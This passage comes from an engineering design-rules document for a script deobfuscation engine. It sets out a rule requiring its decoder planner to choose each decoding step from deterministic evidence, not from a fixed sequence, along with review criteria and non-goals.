> deterministic recovery is possible.
>
> The planner MUST NEVER execute transformations solely because they
> appear next in a predefined sequence.

### Consequences

- Every planner decision is anchored to **objective evidence produced
  by the current artifact state**, not to a fixed transformation
  order.
- Re-planning after every stage means new interpreters or techniques
  exposed mid-pipeline are picked up automatically (a bash script
  hidden inside a decoded PowerShell payload becomes bash, and the
  planner switches interpreter ownership without operator input).
- The planner is provably terminating: every stage must either
  produce evidence of further deterministic recovery (Rule 24) or
  trip the Decoder Stability Gate (IEDDE §4).
- No plugin ever runs "just to try" — Rule 20 primitives are
  candidates the planner may choose, not steps in a hard-coded chain.

### Compliance check (applied when IEDDE Stage 4 is under review)

Reviewers MUST reject any PR that:
- Implements the planner as an ordered list of decoder invocations.
- Runs a decoder without an evidence signal that specifically
  justifies that decoder.
- Skips re-inspection of the artifact between stages.
- Continues past the Decoder Stability Gate without a reasoned stop
  message.

### Non-goals of Rule 26

- Does **not** authorise implementing the Recipe Planner before
  IEDDE Stages 1–3 are complete.
- Does **not** override Rules 20 / 21 / 22 / 23 / 24 / 25.
- Does **not** authorise LLM-based planning. Planning is strictly
  deterministic; the evidence signals it consumes are deterministic
  measurements (entropy, printable ratio, syntax markers, interpreter
  positive-ID, layer-count deltas).

### Why this rule now

Codified during PR-4 ratification (2026-02) because the intelligence
gap between "runs the next decoder" and "chooses the next decoder
from evidence" is what separates NivXRay's current engine from the
IEDDE target architecture. Naming it as a rule now guarantees the
Stage 4 implementation will be evaluated against this bar rather
than drifting into a static-pipeline substitute.

Rule 26 is the **operational teeth** of Rule 24 (Understand-First
Decoding) and Rule 23 (Deterministic Canonical Simplification).

